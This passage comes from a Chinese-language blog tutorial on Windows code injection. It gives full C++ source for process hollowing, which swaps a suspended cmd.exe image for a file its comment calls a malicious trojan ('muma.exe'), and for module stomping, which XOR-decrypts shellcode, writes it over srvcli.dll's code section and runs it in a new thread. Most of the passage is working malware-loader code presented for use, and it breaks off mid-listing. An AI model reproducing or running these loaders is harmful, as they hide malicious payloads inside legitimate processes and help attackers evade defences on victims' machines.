<h3 id="6-更新目标进程的线程上下文"><a href="#6-更新目标进程的线程上下文" class="headerlink" title="6.更新目标进程的线程上下文"></a>6.更新目标进程的线程上下文</h3><p>将程序计数器（EAX&#x2F;RAX 或 ECX&#x2F;RCX 寄存器）设置为替换映像的入口点地址，并更新目标进程PEB中的映像基地址</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p>设置目标进程的线程上下文，使其使用新的上下文信息</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx); <span class="comment">// 设置线程上下文</span></span><br></pre></td></tr></table></figure>



<h3 id="7-恢复目标进程的主线程"><a href="#7-恢复目标进程的主线程" class="headerlink" title="7.恢复目标进程的主线程"></a>7.恢复目标进程的主线程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread); <span class="comment">// 恢复挂起线程</span></span><br></pre></td></tr></table></figure>



<h2 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 定义变量和结构体</span></span><br><span class="line">    IN PIMAGE_DOS_HEADER pDosHeaders;</span><br><span class="line">    IN PIMAGE_NT_HEADERS pNtHeaders;</span><br><span class="line">    IN PIMAGE_SECTION_HEADER pSectionHeaders;</span><br><span class="line">    IN PVOID FileImage;</span><br><span class="line">    IN HANDLE hFile;</span><br><span class="line">    OUT DWORD FileReadSize;</span><br><span class="line">    IN DWORD dwFileSize;</span><br><span class="line">    IN PVOID RemoteImageBase;</span><br><span class="line">    IN PVOID RemoteProcessMemory;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//用于替换的恶意程序</span></span><br><span class="line">    <span class="type">char</span> path[] = <span class="string">&quot;E:\\muma.exe&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建挂起的cmd进程</span></span><br><span class="line">    BOOL bRet = <span class="built_in">CreateProcessA</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        (LPSTR)<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        FALSE,</span><br><span class="line">        CREATE_SUSPENDED,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取恶意程序的内容至本进程内存中</span></span><br><span class="line">    hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>); <span class="comment">//获取替换可执行文件的大小</span></span><br><span class="line">    FileImage = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取恶意程序的文件头信息(Dos头和Nt头)</span></span><br><span class="line">    pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  <span class="comment">//获取Dos头</span></span><br><span class="line">    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="comment">//获取NT头</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取挂起进程的上下文</span></span><br><span class="line">    <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx); </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> <span class="comment">//获取挂起进程的映像基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase); <span class="comment">//卸载已存在文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为可执行映像分配内存,并写入文件头</span></span><br><span class="line">    RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//逐段写入</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将rax寄存器设置为注入软件的入口点</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">//将eax寄存器设置为注入软件的入口点</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    lea eax</span></span><br><span class="line"><span class="comment">    call eax</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx); <span class="comment">// 设置线程上下文</span></span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread); <span class="comment">// 恢复挂起线程</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="16-模块践踏"><a href="#16-模块践踏" class="headerlink" title="16.模块践踏"></a>16.模块践踏</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>模块践踏通常涉及到选择一个已经加载到内存中的模块，然后覆盖或替换这个模块的部分内容，通常是其.text段（代码段），以实现恶意代码的注入</p>
<h2 id="实现思路-3"><a href="#实现思路-3" class="headerlink" title="实现思路"></a>实现思路</h2><ol>
<li>在内存中加载srvcli.dll模块，并找到这个模块在内存中的地址。</li>
<li>定义了一个包含加密后shellcode的数组（encryptedShellcode）和一个密钥（key）。此shellcode是以异或加密的形式给出的。</li>
<li>创建一个新的数组（shellcode），用于存储解密后的shellcode。使用给定的密钥对加密的shellcode进行解密。</li>
<li>调用<code>NtProtectVirtualMemory</code>函数改变选定内存区域的保护属性，将其改为可读写。</li>
<li>使用<code>RtlMoveMemory</code>函数将解密后的shellcode复制到目标模块（srvcli.dll）在内存中的地址。</li>
<li>使用<code>NtProtectVirtualMemory</code>函数恢复原来的内存保护属性。</li>
<li>创建一个新线程来执行注入的shellcode。新线程的入口点设置为shellcode的内存地址。</li>
<li>调用<code>NtWaitForSingleObject</code>等待新创建的线程执行完毕。</li>
</ol>
<h2 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;crypt32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFLEN 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">WCHAR* slib = (WCHAR*)<span class="string">L&quot;C:\\Windows\\system32\\srvcli.dll&quot;</span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtAllocateVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG_PTR ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	PSIZE_T RegionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG AllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Protect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtProtectVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT PSIZE_T RegionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ULONG NewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PULONG OldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PHANDLE hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ULONG Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T StackZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T SizeOfStackCommit,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T SizeOfStackReserve,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PVOID lpBytesBuffer</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtWaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN BOOLEAN Alertable,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PLARGE_INTEGER Timeout</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DecryptAES</span><span class="params">(<span class="type">char</span>* shellcode, DWORD shellcodeLen, <span class="type">char</span>* key, DWORD keyLen)</span> </span>&#123;</span><br><span class="line">	HCRYPTPROV hProv;</span><br><span class="line">	HCRYPTHASH hHash;</span><br><span class="line">	HCRYPTKEY hKey;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptAcquireContextW</span>(&amp;hProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES,</span><br><span class="line">		CRYPT_VERIFYCONTEXT)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptAcquireContextW (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptCreateHash</span>(hProv, CALG_SHA_256, <span class="number">0</span>, <span class="number">0</span>, &amp;hHash)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptCreateHash (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptHashData</span>(hHash, (BYTE*)key, keyLen, <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptHashData (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptDeriveKey</span>(hProv, CALG_AES_256, hHash, <span class="number">0</span>, &amp;hKey)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptDeriveKey (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptDecrypt</span>(hKey, (HCRYPTHASH)<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, (BYTE*)shellcode,</span><br><span class="line">		&amp;shellcodeLen)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptDecrypt (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CryptReleaseContext</span>(hProv, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">CryptDestroyHash</span>(hHash);</span><br><span class="line">	<span class="built_in">CryptDestroyKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 填写xor加密后的shellcode</span></span><br><span class="line">	<span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义解密所用的密钥</span></span><br><span class="line">	<span class="type">char</span> key[] = <span class="string">&quot;12henry1222345??6aa+-==@asd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	DWORD payload_length = <span class="built_in">sizeof</span>(encryptedShellcode);</span><br><span class="line">	PVOID BaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T dwSize = <span class="number">0x2000</span>;</span><br><span class="line">	HMODULE addr;</span><br><span class="line">	addr = <span class="built_in">LoadLibrary</span>(slib);</span><br><span class="line">	BaseAddress = addr + <span class="number">0x1000</span> * <span class="number">2</span> + <span class="number">0xf</span>; <span class="comment">//2kb+f</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; ptr：%p&quot;</span>, BaseAddress);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line">	<span class="comment">// 获取密钥的长度</span></span><br><span class="line">	<span class="type">int</span> keylength = <span class="built_in">strlen</span>(key);</span><br><span class="line">	<span class="comment">// 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">		shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">NtProtectVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;BaseAddress, (PSIZE_T)&amp;dwSize,</span><br><span class="line">		PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlMoveMemory</span>(BaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	<span class="built_in">NtProtectVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;BaseAddress, (PSIZE_T)&amp;dwSize,</span><br><span class="line">		OldProtect, &amp;OldProtect);</span><br><span class="line">	HANDLE hHostThread = INVALID_HANDLE_VALUE;</span><br><span class="line">	NTSTATUS NtCreateThreadstatus = <span class="built_in">NtCreateThreadEx</span>(&amp;hHostThread, <span class="number">0x1FFFFF</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="built_in">NtCurrentProcess</span>(), (LPTHREAD_START_ROUTINE)BaseAddress, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(NtCreateThreadstatus)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed in sysNtCreateThreadEx (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LARGE_INTEGER Timeout;</span><br><span class="line">	Timeout.QuadPart = <span class="number">-10000000</span>;</span><br><span class="line">	NTSTATUS NTWFSOstatus = <span class="built_in">NtWaitForSingleObject</span>(hHostThread, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(NTWFSOstatus)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed in sysNtWaitForSingleObject (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span 